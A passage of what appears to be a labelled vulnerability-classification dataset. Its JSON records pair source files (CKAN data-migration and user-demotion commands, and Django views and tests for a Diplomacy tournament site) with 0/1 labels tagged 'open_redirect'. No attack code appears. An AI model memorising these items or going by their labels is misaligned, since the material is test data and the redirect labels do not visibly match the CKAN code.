pkg:\n                notes = pkg['notes'] or pkg['title']\n\n            if 'update_frequency' in pkg:\n                update_frequency = pkg['update_frequency'] or default_update_frequency\n\n            try:\n                self.update_package(package_id, security_classification, data_driven_application, version, author_email, notes, update_frequency, resources)\n            except ValidationError as e:\n                print ('Package Failed: ', package_id, '\\n', e.error_dict, )\n                print ('Package Payload: ', package_id, security_classification, data_driven_application, version, author_email, notes, update_frequency, resources)\n\n        return 'SUCCESS'\n\n\nclass DemotePublishers(CkanCommand):\n    \"\"\"Demotes any existing 'publisher-*' users from admin to editor in their respective organisations\n    \"\"\"\n\n    summary = __doc__.split('\\n')[0]\n\n    def __init__(self, name):\n\n        super(DemotePublishers, self).__init__(name)\n        self.parser.add_option('-u', '--username_prefix', dest='username_prefix', help='Only demote usernames starting with this prefix', type=str, default='publisher-')\n\n    def get_organizations(self):\n        return toolkit.get_action('organization_list')(data_dict={'all_fields': True, 'include_users': True})\n\n    def patch_organisation_users(self, org_id, users):\n        toolkit.get_action('organization_patch')(data_dict={'id': org_id, 'users': users})\n\n    def command(self):\n        \"\"\"\n\n        :return:\n        \"\"\"\n        self._load_config()\n\n        username_prefix = self.options.username_prefix\n\n        updates = 0\n\n        for org in self.get_organizations():\n            print('- - - - - - - - - - - - - - - - - - - - - - - - -')\n            updates_required = False\n            users = org.get('users', [])\n            print('Processing organisation ID: %s | Name: %s' % (org['id'], org['name']))\n            if users:\n                for user in org['users']:\n                    if user['name'].startswith(username_prefix) and user['capacity'] == 'admin':\n                        print('- Setting capacity for user %s to \"editor\" in organisation %s' % (user['name'], org['name']))\n                        user['capacity'] = 'editor'\n                        updates_required = True\n                        updates += 1\n                if updates_required:\n                    print('- Updating user capacities for organisation %s' % org['name'])\n                    self.patch_organisation_users(org['id'], users)\n                else:\n                    print('- Nothing to update for organisation %s' % org['name'])\n\n        print('- - - - - - - - - - - - - - - - - - - - - - - - -')\n\n        return \"COMPLETED. Total updates %s\\n\" % updates\n/n/n/n", "label": 0, "vtype": "open_redirect"}, {"id": "84cadcdc2efe01e2ced1b3901ebbdbba6de5e592", "code": "/ckanext/data_qld/commands.py/n/nimport ckan.model as model\nimport ckan.plugins.toolkit as toolkit\nimport sqlalchemy\nfrom ckan.lib.cli import CkanCommand\nfrom ckan.model.package import Package\nfrom ckanapi import LocalCKAN\n\n_and_ = sqlalchemy.and_\n\n\nclass MigrateExtras(CkanCommand):\n    \"\"\"Migrates legacy field values that were added as free extras to datasets to their schema counterparts.\n    \"\"\"\n\n    summary = __doc__.split('\\n')[0]\n\n    def __init__(self, name):\n\n        super(MigrateExtras, self).__init__(name)\n\n    def get_package_ids(self):\n        session = model.Session\n        package_ids = []\n\n        packages = (\n            session.query(\n                Package\n            )\n        )\n\n        for pkg in packages:\n            package_ids.append(pkg.id)\n\n        return package_ids\n\n    def update_package(self, package_id, security_classification, data_driven_application, version, author_email, notes, update_frequency, resources):\n        # https://github.com/ckan/ckanext-scheming/issues/158\n        destination = LocalCKAN()\n        destination.action.package_patch(id=package_id,\n                                         security_classification=security_classification,\n                                         data_driven_application=data_driven_application,\n                                         version=version,\n                                         author_email=author_email,\n                                         notes=notes,\n                                         update_frequency=update_frequency,\n                                         resources=resources)\n\n    def command(self):\n        \"\"\"\n\n        :return:\n        \"\"\"\n        self._load_config()\n\n        context = {'session': model.Session}\n\n        # Step 1: Get all the package IDs.\n        package_ids = self.get_package_ids()\n\n        for package_id in package_ids:\n            # Set some defaults\n            default_security_classification = \"PUBLIC\"\n            default_data_driven_application = \"NO\"\n            default_version = \"1.0\"\n            default_author_email = \"opendata@qld.gov.au\"\n            default_update_frequency = \"annually\"\n            default_size = '1'  # 1 Byte\n            resources = []\n\n            pkg = toolkit.get_action('package_show')(context, {\n                'id': package_id\n            })\n\n            if pkg['resources']:\n                size = default_size\n\n                for resource in pkg['resources']:\n                    if 'size' in resource:\n                        size = resource['size'] if resource['size'] is not None and resource[\n                            'size'] != '0 bytes' else default_size\n\n                    if 'name' in resource:\n                        name = resource['name']\n\n                    if 'description' in resource:\n                        description = resource['description'] or name\n\n                    update_resource = {\n                        \"id\": resource['id'],\n                        \"size\": size,\n                        \"name\": name,\n                        \"description\": description\n                    }\n                    resources.append(update_resource)\n\n            # Go through the packages and check for presence of 'Security classification'\n            # and 'Used in data-driven application' extras\n            security_classification = default_security_classification\n            data_driven_application = default_data_driven_application\n            version = default_version\n            author_email = default_author_email\n            update_frequency = default_update_frequency\n\n            if pkg.get('extras', None):\n\n                for extra in pkg['extras']:\n                    if extra['key'] == 'Security classification':\n                        security_classification = extra['value'] or default_security_classification\n                    elif extra['key'] in ['Used in data-driven application']:\n                        data_driven_application = extra['value'] or default_data_driven_application\n\n            if 'version' in pkg:\n                version = pkg['version'] or default_version\n\n            if 'author_email' in pkg:\n                author_email = pkg['author_email'] or default_author_email\n\n            if 'notes' in pkg:\n                notes = pkg['notes'] or pkg['title']\n\n            if 'update_frequency' in pkg:\n                update_frequency = pkg['update_frequency'] or default_update_frequency\n\n            self.update_package(package_id, security_classification, data_driven_application, version, author_email, notes, update_frequency, resources)\n\n        return 'SUCCESS'\n\n\nclass DemotePublishers(CkanCommand):\n    \"\"\"Demotes any existing 'publisher-*' users from admin to editor in their respective organisations\n    \"\"\"\n\n    summary = __doc__.split('\\n')[0]\n\n    def __init__(self, name):\n\n        super(DemotePublishers, self).__init__(name)\n        self.parser.add_option('-u', '--username_prefix', dest='username_prefix', help='Only demote usernames starting with this prefix', type=str, default='publisher-')\n\n    def get_organizations(self):\n        return toolkit.get_action('organization_list')(data_dict={'all_fields': True, 'include_users': True})\n\n    def patch_organisation_users(self, org_id, users):\n        toolkit.get_action('organization_patch')(data_dict={'id': org_id, 'users': users})\n\n    def command(self):\n        \"\"\"\n\n        :return:\n        \"\"\"\n        self._load_config()\n\n        username_prefix = self.options.username_prefix\n\n        updates = 0\n\n        for org in self.get_organizations():\n            print('- - - - - - - - - - - - - - - - - - - - - - - - -')\n            updates_required = False\n            users = org.get('users', [])\n            print('Processing organisation ID: %s | Name: %s' % (org['id'], org['name']))\n            if users:\n                for user in org['users']:\n                    if user['name'].startswith(username_prefix) and user['capacity'] == 'admin':\n                        print('- Setting capacity for user %s to \"editor\" in organisation %s' % (user['name'], org['name']))\n                        user['capacity'] = 'editor'\n                        updates_required = True\n                        updates += 1\n                if updates_required:\n                    print('- Updating user capacities for organisation %s' % org['name'])\n                    self.patch_organisation_users(org['id'], users)\n                else:\n                    print('- Nothing to update for organisation %s' % org['name'])\n\n        print('- - - - - - - - - - - - - - - - - - - - - - - - -')\n\n        return \"COMPLETED. Total updates %s\\n\" % updates\n/n/n/n", "label": 1, "vtype": "open_redirect"}, {"id": "1ac934531ba0a3f16aee86e3b36a912dc8b67821", "code": "visualiser/tournament/round_views.py/n/n# Diplomacy Tournament Visualiser\n# Copyright (C) 2014, 2016-2019 Chris Brand\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\n\"\"\"\nRound Views for the Diplomacy Tournament Visualiser.\n\"\"\"\n\nfrom django.contrib.auth.decorators import permission_required\nfrom django.core.exceptions import ValidationError\nfrom django.db.models import Sum\nfrom django.forms.formsets import formset_factory\nfrom django.http import Http404, HttpResponseRedirect\nfrom django.shortcuts import render\nfrom django.urls import reverse\nfrom django.utils.translation import ugettext as _\n\nfrom tournament.forms import BaseGamePlayersFormset\nfrom tournament.forms import BasePlayerRoundFormset\nfrom tournament.forms import BasePowerAssignFormset\nfrom tournament.forms import GamePlayersForm\nfrom tournament.forms import GameScoreForm\nfrom tournament.forms import GetSevenPlayersForm\nfrom tournament.forms import PlayerRoundForm\nfrom tournament.forms import PowerAssignForm\n\nfrom tournament.tournament_views import get_modifiable_tournament_or_404\nfrom tournament.tournament_views import get_visible_tournament_or_404\n\nfrom tournament.diplomacy import GreatPower, GameSet\nfrom tournament.email import send_board_call\nfrom tournament.game_seeder import GameSeeder\nfrom tournament.models import Tournament, Round, Game\nfrom tournament.models import TournamentPlayer, RoundPlayer, GamePlayer\n\n# Round views\n\ndef get_round_or_404(tournament, round_num):\n    \"\"\"Return the specified numbered round of the specified tournament or raise Http404.\"\"\"\n    try:\n        return tournament.round_numbered(round_num)\n    except Round.DoesNotExist:\n        raise Http404\n\ndef round_simple(request, tournament_id, round_num, template):\n    \"\"\"Just render the specified template with the round\"\"\"\n    t = get_visible_tournament_or_404(tournament_id, request.user)\n    r = get_round_or_404(t, round_num)\n    context = {'tournament': t, 'round': r}\n    return render(request, 'rounds/%s.html' % template, context)\n\n@permission_required('tournament.add_roundplayer')\ndef roll_call(request, tournament_id, round_num=None):\n    \"\"\"Provide a form to specify which players are playing each round\"\"\"\n    t = get_modifiable_tournament_or_404(tournament_id, request.user)\n    PlayerRoundFormset = formset_factory(PlayerRoundForm,\n                                         extra=2,\n                                         formset=BasePlayerRoundFormset)\n    if round_num:\n        r = get_round_or_404(t, round_num)\n        round_set = t.round_set.filter(pk=r.pk)\n    else:\n        round_set = t.round_set.all()\n    data = []\n    # Go through each player in the Tournament\n    for tp in t.tournamentplayer_set.all():\n        current = {'player': tp.player}\n        rps = tp.roundplayers()\n        # And each round of the Tournament\n        for r in round_set:\n            # Is this player listed as playing this round ?\n            played = rps.filter(the_round=r).exists()\n            current['round_%d' % r.number()] = played\n        data.append(current)\n    if round_num:\n        formset = PlayerRoundFormset(request.POST or None,\n                                     tournament=t,\n                                     round_num=int(round_num),\n                                     initial=data)\n    else:\n        formset = PlayerRoundFormset(request.POST or None,\n                                     tournament=t,\n                                     initial=data)\n    if formset.is_valid():\n        for form in formset:\n            try:\n                p = form.cleaned_data['player']\n            except KeyError:\n                # This must be one of the extra forms, still empty\n                continue\n            # Ensure that this Player is in the Tournament\n            i, created = TournamentPlayer.objects.get_or_create(player=p,\n                                                                tournament=t)\n            try:\n                i.full_clean()\n            except ValidationError as e:\n                form.add_error(form.fields['player'], e)\n                i.delete()\n                return render(request,\n                              'tournaments/round_players.html',\n                              {'title': _('Roll Call'),\n                               'tournament': t,\n                               'post_url': reverse('roll_call', args=(tournament_id,)),\n                               'formset' : formset})\n            if created:\n                i.save()\n            for r_name, value in form.cleaned_data.items():\n                if r_name == 'player':\n                    # This column is just for the user\n                    continue\n                # Extract the round number from the field name\n                i = int(r_name[6:])\n                # Find that Round\n                r = t.round_numbered(i)\n                # Ignore non-bool fields and ones that aren't True\n                if value is True:\n                    # Ensure that we have a corresponding RoundPlayer\n                    i, created = RoundPlayer.objects.get_or_create(player=p,\n                                                                   the_round=r)\n                    try:\n                        i.full_clean()\n                    except ValidationError as e:\n                        form.add_error(None, e)\n                        i.delete()\n                        return render(request,\n                                      'tournaments/round_players.html',\n                                      {'title': _('Roll Call'),\n                                       'tournament': t,\n                                       'post_url': reverse('roll_call', args=(tournament_id,)),\n                                       'formset' : formset})\n                    if created:\n                        i.save()\n                else:\n                    # delete any corresponding RoundPlayer\n                    # This could be a player who was previously checked-off in error\n                    RoundPlayer.objects.filter(player=p,\n                                               the_round=r).delete()\n        r = t.current_round()\n        # If we're doing a roll call for a single round,\n        # we only want to seed boards if it's the current round\n        if not round_num or (r.number() == round_num):\n            if t.seed_games:\n                # Seed the games. Note that this will redirect to 'get_seven\" if necessary\n                return HttpResponseRedirect(reverse('seed_games',\n                                                    args=(tournament_id,\n                                                          r.number())))\n            else:\n                # Next job is almost certainly to create the actual games\n                return HttpResponseRedirect(reverse('create_games',\n                                                    args=(tournament_id,\n                                                          r.number())))\n\n    return render(request,\n                  'tournaments/round_players.html',\n                  {'title': _('Roll Call'),\n                   'tournament': t,\n                   'post_url': reverse('roll_call', args=(tournament_id,)),\n                   'formset' : formset})\n\n@permission_required('tournament.add_game')\ndef get_seven(request, tournament_id, round_num):\n    \"\"\"Provide a form to get a multiple of seven players for a round\"\"\"\n    t = get_modifiable_tournament_or_404(tournament_id, request.user)\n    r = get_round_or_404(t, round_num)\n    count = r.roundplayer_set.count()\n    sitters = count % 7\n    # If we already have an exact multiple of seven players, go straight to creating games\n    if sitters == 0:\n        return HttpResponseRedirect(reverse('seed_games',\n                                            args=(tournament_id,\n                                                  round_num)))\n\n    doubles = 7 - sitters\n    context = {'tournament': t,\n               'round': r,\n               'count' : count,\n               'sitters' : sitters,\n               'doubles' : doubles}\n    form = GetSevenPlayersForm(request.POST or None,\n                               the_round=r)\n    if form.is_valid():\n        # Update RoundPlayers to indicate number of games they're playing\n        # First clear any old game_counts\n        for rp in r.roundplayer_set.exclude(game_count=1):\n            rp.game_count = 1\n            rp.save()\n        for i in range(sitters):\n            rp = form.cleaned_data['sitter_%d' % i]\n            if rp:\n                rp.game_count = 0\n                rp.save()\n        for i in range(doubles):\n            rp = form.cleaned_data['double_%d' % i]\n            if rp:\n                rp.game_count = 2\n                rp.save()\n        return HttpResponseRedirect(reverse('seed_games',\n                                            args=(tournament_id,\n                                                  round_num)))\n    context['form'] = form\n    return render(request,\n                  'rounds/get_seven.html',\n                  context)\n\ndef _sitters_and_two_gamers(tournament, the_round):\n    \"\"\" Return a (sitters, two_gamers) 2-tuple\"\"\"\n    tourney_players = tournament.tournamentplayer_set.all()\n    round_players = the_round.roundplayer_set.all()\n    # Get the set of players that haven't already been assigned to games for this round\n    rps = []\n    sitters = set()\n    two_gamers = set()\n    for rp in round_players:\n        assert rp.gameplayers().count() == 0, \"%d games already exist for %s in this round\" % (rp.gameplayers().count(),\n                                                                                               str(rp))\n        rps.append(rp)\n        if rp.game_count == 1:\n            continue\n        elif rp.game_count == 0:\n            # This player is sitting out this round\n            sitters.add(rp.tournamentplayer())\n        elif rp.game_count == 2:\n            # This player is playing two games this round\n            two_gamers.add(rp.tournamentplayer())\n        else:\n            assert 0, 'Unexpected game_count value %d for %s' % (rp.game_count, str(rp))\n    assert (not sitters) or (not two_gamers)\n    if sitters:\n        # Check that we have the right number of players sitting out\n        assert (len(rps) - len(sitters)) % 7 == 0\n    if two_gamers:\n        # Check that we have the right number of players playing two games\n        assert (len(rps) + len(two_gamers)) % 7 == 0\n    # We also need to flag any players who aren't present for this round as sitting out\n    for tp in tourney_players:\n        if not round_players.filter(player=tp.player).exists():\n            sitters.add(tp)\n    return sitters, two_gamers\n\ndef _create_game_seeder(tournament, round_number):\n    \"\"\"Return a GameSeeder that knows about the tournament so far\"\"\"\n    tourney_players = tournament.tournamentplayer_set.all()\n    # Create the game seeder\n    seeder = GameSeeder(GreatPower.objects.all(),\n                        starts=100,\n                        iterations=10)\n    # Tell the seeder about every player in the tournament\n    # (regardless of whether they're playing this round - they may have played already)\n    for tp in tourney_players:\n        seeder.add_player(tp)\n    # Provide details of games already played this tournament\n    for n in range(1, round_number):\n        rnd = tournament.round_numbered(n)\n        for g in rnd.game_set.all():\n            game = set()\n            for gp in g.gameplayer_set.all():\n                game.add((gp.tournamentplayer(), gp.power))\n            # TODO This doesn't deal with replacement players\n            assert len(game) == 7\n            seeder.add_played_game(game)\n    # Add in any biases now that all players have been added\n    for tp in tourney_players:\n        # Just use seederbias_set so we only get each SeederBias once\n        # because we only look at their player1\n        for sb in tp.seederbias_set.all():\n            seeder.add_bias(sb.player1, sb.player2, sb.weight)\n    return seeder\n\ndef _seed_games(tournament, the_round):\n    \"\"\"Wrapper round GameSeeder to do the actual seeding for a round\"\"\"\n    seeder = _create_game_seeder(tournament, the_round.number())\n    sitters, two_gamers = _sitters_and_two_gamers(tournament, the_round)\n    # Generate the games\n    return seeder.seed_games(omitting_players=sitters,\n                             players_doubling_up=two_gamers)\n\ndef _seed_games_and_powers(tournament, the_round):\n    \"\"\"Wrapper round GameSeeder to do the actual seeding for a round\"\"\"\n    seeder = _create_game_seeder(tournament, the_round.number())\n    sitters, two_gamers = _sitters_and_two_gamers(tournament, the_round)\n    # Generate the games\n    return seeder.seed_games_and_powers(omitting_players=sitters,\n                                        players_doubling_up=two_gamers)\n\n@permission_required('tournament.add_game')\ndef seed_games(request, tournament_id, round_num):\n    \"\"\"Seed players to the games for a round\"\"\"\n    t = get_modifiable_tournament_or_404(tournament_id, request.user)\n    r = get_round_or_404(t, round_num)\n    if request.method == 'POST':\n        PowerAssignFormset = formset_factory(PowerAssignForm,\n                                             formset=BasePowerAssignFormset,\n                                             extra=0)\n        formset = PowerAssignFormset(request.POST, the_round=r)\n        if formset.is_valid():\n            for f in formset:\n                # Update the game\n                g = f.game\n                g.name = f.cleaned_data['game_name']\n                g.the_set = f.cleaned_data['the_set']\n                try:\n                    g.full_clean()\n                except ValidationError as e:\n                    f.add_error(None, e)\n                    return render(request,\n                                  'rounds/seeded_games.html',\n                                  {'tournament': t,\n                                   'round': r,\n                                   'formset' : formset})\n                g.save()\n                # Assign the powers to the players\n                for gp_id, field in f.cleaned_data.items():\n                    if gp_id in ['the_set', 'game_name']:\n                        continue\n                    gp = GamePlayer.objects.get(id=gp_id)\n                    gp.power = field\n                    try:\n                        gp.full_clean()\n                    except ValidationError as e:\n                        f.add_error(None, e)\n                        return render(request,\n                                      'rounds/seeded_games.html',\n                                      {'tournament': t,\n                                       'round': r,\n                                       'formset' : formset})\n                    gp.save()\n            # Notify the players\n            send_board_call(r)\n            # Redirect to the index of games in the round\n            return HttpResponseRedirect(reverse('game_index',\n                                                args=(tournament_id, round_num)))\n    else:\n        # Check for a multiple of seven players,\n        # allowing for players sitting out or playing multiple games\n        player_count = r.roundplayer_set.aggregate(Sum('game_count'))['game_count__sum']\n        if (player_count % 7) != 0:\n            # We need players to sit out or play multiple games\n            return HttpResponseRedirect(reverse('get_seven',\n                                                args=(tournament_id,\n                                                      r.number())))\n        # Delete any existing Games and GamePlayers for this round\n        r.game_set.all().delete()\n        # TODO It's a bit hokey to have a fixed default GameSet here\n        default_set = GameSet.objects.get(pk=1)\n        data = []\n        # Generate a seeding, and assign powers if required\n        if t.power_assignment == Tournament.AUTO:\n            games = _seed_games_and_powers(t, r)\n            # Add the Games and GamePlayers to the database\n            for i, g in enumerate(games, start=1):\n                new_game = Game.objects.create(name='R%sG%d' % (round_num, i),\n                                               the_round=r,\n                                               the_set=default_set)\n                current = {'game_name': new_game.name,\n                           'the_set': new_game.the_set}\n                for tp, power in g:\n                    gp = GamePlayer.objects.create(player=tp.player,\n                                                   game=new_game,\n                                                   power=power)\n                    current[gp.id] = power\n                data.append(current)\n        else:\n            games = _seed_games(t, r)\n            # Add the Games and GamePlayers to the database\n            for i, g in enumerate(games, start=1):\n                new_game = Game.objects.create(name='R%sG%d' % (round_num, i),\n                                               the_round=r,\n                                               the_set=default_set)\n                current = {'game_name': new_game.name,\n                           'the_set': new_game.the_set}\n                for tp in g:\n                    gp = GamePlayer.objects.create(player=tp.player,\n                                                   game=new_game)\n                # If we're assigning powers from preferences, do so now\n                if t.power_assignment == Tournament.PREFERENCES:\n                    new_game.assign_powers_from_prefs()\n                for tp in g:\n                    gp = GamePlayer.objects.get(player=tp.player,\n                                                game=new_game)\n                    current[gp.id] = gp.power\n                data.append(current)\n        # Create a form for each of the resulting games\n        PowerAssignFormset = formset_factory(PowerAssignForm,\n                                             formset=BasePowerAssignFormset,\n                                             extra=0)\n        formset = PowerAssignFormset(the_round=r, initial=data)\n    # Note that we wait for confirmation before adding them to the database\n    context = {'tournament': t, 'round': r, 'games': games, 'formset': formset}\n    return render(request, 'rounds/seeded_games.html', context)\n\n@permission_required('tournament.add_game')\ndef create_games(request, tournament_id, round_num):\n    \"\"\"Provide a form to create the games for a round\"\"\"\n    t = get_modifiable_tournament_or_404(tournament_id, request.user)\n    r = get_round_or_404(t, round_num)\n    # Do any games already exist for the round ?\n    games = r.game_set.all()\n    data = []\n    for g in games:\n        current = {'game_name': g.name,\n                   'the_set': g.the_set}\n        for gp in g.gameplayer_set.all():\n            current[gp.power.name] = gp.roundplayer()\n        data.append(current)\n    # Estimate the number of games for the round\n    round_players = r.roundplayer_set.count()\n    expected_games = (round_players + 6) // 7\n    # This can happen if there are no RoundPlayers for this round\n    if expected_games < 1:\n        expected_games = 1\n    GamePlayersFormset = formset_factory(GamePlayersForm,\n                                         extra=expected_games - games.count(),\n                                         formset=BaseGamePlayersFormset)\n    formset = GamePlayersFormset(request.POST or None,\n                                 the_round=r,\n                                 initial=data)\n    if formset.is_valid():\n        for f in formset:\n            # Update/create the game\n            try:\n                g, created = Game.objects.get_or_create(name=f.cleaned_data['game_name'],\n                                                        the_round=r,\n                                                        the_set=f.cleaned_data['the_set'])\n            except KeyError:\n                # This must be an extra, unused formset\n                continue\n            try:\n                g.full_clean()\n            except ValidationError as e:\n                f.add_error(None, e)\n                g.delete()\n                return render(request,\n                              'rounds/create_games.html',\n                              {'tournament': t,\n                               'round': r,\n                               'formset' : formset})\n            if created:\n                g.save()\n            # Assign the players to the game\n            for power, field in f.cleaned_data.items():\n                try:\n                    p = GreatPower.objects.get(name=power)\n                except GreatPower.DoesNotExist:\n                    continue\n                # Is there already a player for this power in this game ?\n                try:\n                    i = GamePlayer.objects.get(game=g,\n                                               power=p)\n                except GamePlayer.DoesNotExist:\n                    # Create one (default first_season and first_year)\n                    i = GamePlayer(player=field.player, game=g, power=p)\n                else:\n                    # Change the player (if necessary)\n                    i.player = field.player\n                try:\n                    i.full_clean()\n                except ValidationError as e:\n                    f.add_error(None, e)\n                    # TODO Not 100% certain that this is the right thing to do here\n                    i.delete()\n                    return render(request,\n                                  'rounds/create_games.html',\n                                  {'tournament': t,\n                                   'round': r,\n                                   'formset' : formset})\n                i.save()\n        # Notify the players\n        send_board_call(r)\n        # Redirect to the index of games in the round\n        return HttpResponseRedirect(reverse('game_index',\n                                            args=(tournament_id, round_num)))\n\n    return render(request,\n                  'rounds/create_games.html',\n                  {'tournament': t,\n                   'round': r,\n                   'formset' : formset})\n\n@permission_required('tournament.change_gameplayer')\ndef game_scores(request, tournament_id, round_num):\n    \"\"\"Provide a form to enter scores for all the games in a round\"\"\"\n    t = get_modifiable_tournament_or_404(tournament_id, request.user)\n    r = get_round_or_404(t, round_num)\n    GameScoreFormset = formset_factory(GameScoreForm,\n                                       extra=0)\n    # Initial data\n    data = []\n    the_list = r.game_set.all()\n    for game in the_list:\n        content = {'game_name': game.name}\n        for gp in game.gameplayer_set.all():\n            content[gp.power.name] = gp.score\n        data.append(content)\n    formset = GameScoreFormset(request.POST or None, initial=data)\n    if formset.is_valid():\n        for f in formset:\n            # Find the game\n            g = Game.objects.get(name=f.cleaned_data['game_name'],\n                                 the_round=r)\n            # Set the score for each player\n            for power, field in f.cleaned_data.items():\n                # Ignore non-GreatPower fields (game_name)\n                try:\n                    p = GreatPower.objects.get(name=power)\n                except GreatPower.DoesNotExist:\n                    continue\n                # Find the matching GamePlayer\n                # TODO This will fail if there was a replacement\n                i = GamePlayer.objects.get(game=g,\n                                           power=p)\n                # Set the score\n                i.score = field\n                try:\n                    i.full_clean()\n                except ValidationError as e:\n                    f.add_error(None, e)\n                    return render(request,\n                                  'rounds/game_score.html',\n                                  {'tournament': t,\n                                   'round': round_num,\n                                   'formset' : formset})\n                i.save()\n        # Redirect to the round index\n        return HttpResponseRedirect(reverse('round_index',\n                                            args=(tournament_id)))\n\n    return render(request,\n                  'rounds/game_score.html',\n                  {'tournament': t,\n                   'round': round_num,\n                   'formset' : formset})\n\ndef game_index(request, tournament_id, round_num):\n    \"\"\"Display a list of games in the round\"\"\"\n    t = get_visible_tournament_or_404(tournament_id, request.user)\n    r = get_round_or_404(t, round_num)\n    the_list = r.game_set.all()\n    context = {'round': r, 'game_list': the_list}\n    return render(request, 'games/index.html', context)\n/n/n/nvisualiser/tournament/test_round_views.py/n/n# Diplomacy Tournament Visualiser\n# Copyright (C) 2019 Chris Brand\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nfrom django.contrib.auth.models import Permission, User\nfrom django.test import TestCase\nfrom django.urls import reverse\nfrom django.utils import timezone\n\nfrom tournament.game_scoring import G_SCORING_SYSTEMS\nfrom tournament.models import Tournament, TournamentPlayer\nfrom tournament.models import Round, RoundPlayer\nfrom tournament.models import R_SCORING_SYSTEMS, T_SCORING_SYSTEMS\nfrom tournament.players import Player\n\nclass RoundViewTests(TestCase):\n    fixtures = ['game_sets.json']\n\n    @classmethod\n    def setUpTestData(cls):\n        # A superuser\n        cls.USERNAME1 = 'superuser'\n        cls.PWORD1 = 'l33tPw0rd'\n        u1 = User.objects.create_user(username=cls.USERNAME1,\n                                      password=cls.PWORD1,\n                                      is_superuser=True)\n        u1.save()\n\n        # Some Players\n        p1 = Player.objects.create(first_name='Angela',\n                                   last_name='Ampersand')\n        p2 = Player.objects.create(first_name='Bobby',\n                                   last_name='Bandersnatch')\n        p3 = Player.objects.create(first_name='Cassandra',\n                                   last_name='Cucumber')\n        p4 = Player.objects.create(first_name='Derek',\n                                   last_name='Dromedary')\n        p5 = Player.objects.create(first_name='Ethel',\n                                   last_name='Elephant')\n        p6 = Player.objects.create(first_name='Frank',\n                                   last_name='Frankfurter')\n        p7 = Player.objects.create(first_name='Georgette',\n                                   last_name='Grape')\n        p8 = Player.objects.create(first_name='Harry',\n                                   last_name='Heffalump')\n        p9 = Player.objects.create(first_name='Iris',\n                                   last_name='Ignoramus')\n        p10 = Player.objects.create(first_name='Jake',\n                                    last_name='Jalopy')\n        p11 = Player.objects.create(first_name='Katrina',\n                                    last_name='Kingpin')\n        p12 = Player.objects.create(first_name='Lucas',\n                                    last_name='Lemon')\n        p13 = Player.objects.create(first_name='Margaret',\n                                    last_name='Maleficent')\n\n        now = timezone.now()\n        # Published Tournament so it's visible to all\n        cls.t = Tournament.objects.create(name='t1',\n                                          start_date=now,\n                                          end_date=now,\n                                          round_scoring_system=R_SCORING_SYSTEMS[0].name,\n                                          tournament_scoring_system=T_SCORING_SYSTEMS[0].name,\n                                          draw_secrecy=Tournament.SECRET,\n                                          is_published=True)\n        cls.r1 = Round.objects.create(tournament=cls.t,\n                                      scoring_system=G_SCORING_SYSTEMS[0].name,\n                                      dias=True,\n                                      start=cls.t.start_date)\n        # Add TournamentPlayers\n        tp = TournamentPlayer.objects.create(player=p1,\n                                             tournament=cls.t)\n        tp = TournamentPlayer.objects.create(player=p2,\n                                             tournament=cls.t)\n        tp = TournamentPlayer.objects.create(player=p3,\n                                             tournament=cls.t)\n        tp = TournamentPlayer.objects.create(player=p4,\n                                             tournament=cls.t)\n        tp = TournamentPlayer.objects.create(player=p5,\n                                             tournament=cls.t)\n        tp = TournamentPlayer.objects.create(player=p6,\n                                             tournament=cls.t)\n        tp = TournamentPlayer.objects.create(player=p7,\n                                             tournament=cls.t)\n        tp = TournamentPlayer.objects.create(player=p8,\n                                             tournament=cls.t)\n        tp = TournamentPlayer.objects.create(player=p9,\n                                             tournament=cls.t)\n        tp = TournamentPlayer.objects.create(player=p10,\n                                             tournament=cls.t)\n        tp = TournamentPlayer.objects.create(player=p11,\n                                             tournament=cls.t)\n        tp = TournamentPlayer.objects.create(player=p12,\n                                             tournament=cls.t)\n        tp = TournamentPlayer.objects.create(player=p13,\n                                             tournament=cls.t)\n        # And RoundPlayers\n        RoundPlayer.objects.create(player=p1, the_round=cls.r1)\n        RoundPlayer.objects.create(player=p2, the_round=cls.r1)\n        RoundPlayer.objects.create(player=p3, the_round=cls.r1)\n        RoundPlayer.objects.create(player=p4, the_round=cls.r1)\n        RoundPlayer.objects.create(player=p5, the_round=cls.r1)\n        RoundPlayer.objects.create(player=p6, the_round=cls.r1)\n        RoundPlayer.objects.create(player=p7, the_round=cls.r1)\n        RoundPlayer.objects.create(player=p8, the_round=cls.r1)\n        RoundPlayer.objects.create(player=p9, the_round=cls.r1)\n        RoundPlayer.objects.create(player=p10, the_round=cls.r1)\n        RoundPlayer.objects.create(player=p11, the_round=cls.r1)\n        RoundPlayer.objects.create(player=p12, the_round=cls.r1)\n        RoundPlayer.objects.create(player=p13, the_round=cls.r1)\n\n    def test_detail(self):\n        response = self.client.get(reverse('round_detail', args=(self.t.pk, 1)))\n        self.assertEqual(response.status_code, 200)\n\n    def test_create_games_not_logged_in(self):\n        response = self.client.get(reverse('create_games', args=(self.t.pk, 1)))\n        self.assertEqual(response.status_code, 302)\n\n    def test_get_seven_not_logged_in(self):\n        response = self.client.get(reverse('get_seven', args=(self.t.pk, 1)))\n        self.assertEqual(response.status_code, 302)\n\n    def test_seed_games_not_logged_in(self):\n        response = self.client.get(reverse('seed_games', args=(self.t.pk, 1)))\n        self.assertEqual(response.status_code, 302)\n\n    def test_seed_games_odd_number(self):\n        # if we dont have a mutiple of 7 players, this view should redirect to fix that\n        self.client.login(username=self.USERNAME1, password=self.PWORD1)\n        response = self.client.get(reverse('seed_games', args=(self.t.pk, 1)))\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(response.url, reverse('get_seven', args=(self.t.pk, 1)))\n\n    def test_game_scores_not_logged_in(self):\n        response = self.client.get(reverse('game_scores', args=(self.t.pk, 1)))\n        self.assertEqual(response.status_code, 302)\n\n    def test_games(self):\n        response = self.client.get(reverse('game_index', args=(self.t.pk, 